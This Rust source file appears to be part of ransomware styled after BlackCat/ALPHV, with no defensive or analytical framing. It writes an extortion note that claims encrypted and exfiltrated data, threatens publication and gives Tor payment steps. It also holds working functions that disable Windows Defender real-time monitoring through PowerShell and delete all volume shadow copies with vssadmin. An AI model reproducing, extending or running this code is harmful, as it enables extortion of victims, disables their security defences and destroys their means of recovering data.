use std::process::Command;

pub struct WindowsPlatform;

impl WindowsPlatform {
    #[cfg(target_os = "windows")]
    pub fn create_ransom_note(save_dir: &str, exfil_report: &str) -> Result<(), String> {
        let ransom_content = format!(
r#"-->> BLACKCAT/ALPHV RANSOMWARE <<--

Your important files have been ENCRYPTED and now have ".sttp" extension.

YOUR DATA HAS BEEN EXFILTRATED!
All sensitive data from your system has been downloaded to our servers.
This includes:
- User documents and spreadsheets
- Browser history and passwords
- Email data and attachments
- Network credentials and configuration

If you refuse to pay, all data will be PUBLISHED on our leak site.

EXFILTRATED DATA REPORT:
{}

CAUTION
DO NOT MODIFY FILES YOURSELF.
DO NOT USE THIRD PARTY SOFTWARE TO RESTORE YOUR DATA.
YOU MAY DAMAGE YOUR FILES, RESULTING IN PERMANENT DATA LOSS.
YOUR DATA IS STRONGLY ENCRYPTED WITH AES-256-GCM.

Recovery procedure:
1. Download and install Tor Browser: https://torproject.org/
2. Navigate to: http://blackcat-site.onion/
3. Enter your personal decryption key

Your decryption key will be provided after payment.

=== DO NOT SHARE THIS KEY WITH ANYONE ===
"#, exfil_report);

        let note_path = format!("{}\\README_BLACKCAT.txt", save_dir);
        std::fs::write(&note_path, ransom_content)
            .map_err(|e| format!("Failed to create ransom note: {}", e))?;
        Ok(())
    }

    #[cfg(target_os = "windows")]
    pub fn disable_windows_defender() -> Result<(), String> {
        let _ = Command::new("powershell")
            .args(&["-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"])
            .output();
        Ok(())
    }

    #[cfg(target_os = "windows")]
    pub fn delete_shadow_copies() -> Result<(), String> {
        let _ = Command::new("cmd").args(&["/c", "vssadmin delete shadows /all /quiet"]).output();
        Ok(())
    }

    #[cfg(not(target_os = "windows"))]
    pub fn create_ransom_note(_d: &str, _l: &str) -> Result<(), String> { Ok(()) }
    #[cfg(not(target_os = "windows"))]
    pub fn disable_windows_defender() -> Result<(), String> { Ok(()) }
    #[cfg(not(target_os = "windows"))]
    pub fn delete_shadow_copies() -> Result<(), String> { Ok(()) }
}